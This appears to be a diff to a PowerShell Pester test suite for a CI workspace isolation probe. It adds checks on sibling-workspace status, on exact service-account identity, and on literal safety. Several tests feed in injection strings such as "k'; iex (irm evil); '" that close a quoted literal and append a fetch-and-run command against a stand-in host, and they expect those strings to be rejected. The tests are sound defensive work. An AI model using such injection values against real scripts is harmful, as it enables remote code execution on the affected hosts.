@@ -866,7 +866,7 @@ Describe 'probe verdict' {
             [pscustomobject] @{
                 hostToken     = $true; secretStatus = 403; metricStatus = 403
                 brokerEmail   = 'jobs@p.iam.gserviceaccount.com'
-                siblingDenied = $true; cacheWritable = $true; dnsResolved = $true
+                siblingStatus = 'denied'; cacheWritable = $true; dnsResolved = $true
             }
         }
     }
@@ -929,9 +929,34 @@ Describe 'probe verdict' {
 
     It 'fails a slot that could read a sibling workspace' {
         $r = & $script:CleanProbe
-        $r.siblingDenied = $false
+        $r.siblingStatus = 'allowed'
         (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
             Should -Match 'another slot'
+    }
+
+    # The reviewer's case: Get-ChildItem throws identically on denied and on
+    # absent, so a sibling workspace that had not been created yet would report
+    # a proved ACL boundary if the payload folded the two together.
+    It 'refuses to read an absent sibling workspace as a proved boundary' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'missing'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
+            Should -Match 'never tested'
+    }
+
+    It 'reports any other sibling outcome as unproved' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'error'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail) -join "`n") |
+            Should -Match 'unproved'
+    }
+
+    # Service-account emails are canonically lowercase, so a case difference is
+    # a different identity being passed off as the configured one.
+    It 'holds the broker to the exact identity, case included' {
+        $r = & $script:CleanProbe
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'Jobs@p.iam.gserviceaccount.com') -join "`n") |
+            Should -Match 'vends'
     }
 
     It 'fails an unwritable cache and an unresolvable name' {
@@ -946,7 +971,7 @@ Describe 'probe verdict' {
     It 'reports every reason at once' {
         $r = [pscustomobject] @{
             hostToken     = $false; secretStatus = 200; metricStatus = 200
-            brokerEmail   = ''; siblingDenied = $false; cacheWritable = $false; dnsResolved = $false
+            brokerEmail   = ''; siblingStatus = 'allowed'; cacheWritable = $false; dnsResolved = $false
         }
         @(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com').Count |
             Should -Be 7
@@ -1006,6 +1031,59 @@ Describe 'probe payload' {
         $p = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
             -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
         $p | Should -Not -Match 'service-accounts/default/email'
+    }
+}
+
+Describe 'probe literal safety' {
+    # Everything Get-ProbeScript interpolates becomes code in a payload that
+    # runs holding a live host token, and the secret name and broker endpoint
+    # both arrive from instance metadata -- which section 3A says outright is
+    # writable by anything holding the machine's identity.
+    It 'accepts the shapes the pool actually produces' {
+        Test-ProbeLiteral -Value 'ci-app-key' -Kind 'name' | Should -BeTrue
+        Test-ProbeLiteral -Value '127.0.0.1:8081' -Kind 'endpoint' | Should -BeTrue
+        Test-ProbeLiteral -Value 'C:\ci\slots\ci-s1\w' -Kind 'path' | Should -BeTrue
+    }
+
+    It 'accepts an empty value, which means the caller configured nothing' {
+        Test-ProbeLiteral -Value '' -Kind 'name' | Should -BeTrue
+        Test-ProbeLiteral -Value '' -Kind 'endpoint' | Should -BeTrue
+    }
+
+    # One apostrophe closes the literal it lands in and appends statements.
+    It 'rejects a value that would close its own literal' {
+        Test-ProbeLiteral -Value "k'; iex (irm evil); '" -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value "1.2.3.4:1'; iex (irm evil); '" -Kind 'endpoint' | Should -BeFalse
+        Test-ProbeLiteral -Value "C:\w'; iex (irm evil); '" -Kind 'path' | Should -BeFalse
+    }
+
+    It 'rejects a subexpression and a newline as well as a quote' {
+        Test-ProbeLiteral -Value 'a$(hostname)' -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value "a`nb" -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value 'host:80/x' -Kind 'endpoint' | Should -BeFalse
+    }
+
+    # Throw, not sanitize: a stripped value still builds a payload, and a
+    # payload that measured the wrong secret is worse than a stopped boot.
+    It 'refuses to build a payload from an injected secret name' {
+        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
+    It 'refuses to build a payload from an injected broker endpoint' {
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
+    It 'refuses to build a payload from an injected path' {
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:'; iex (irm evil); '" } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
     }
 }
 
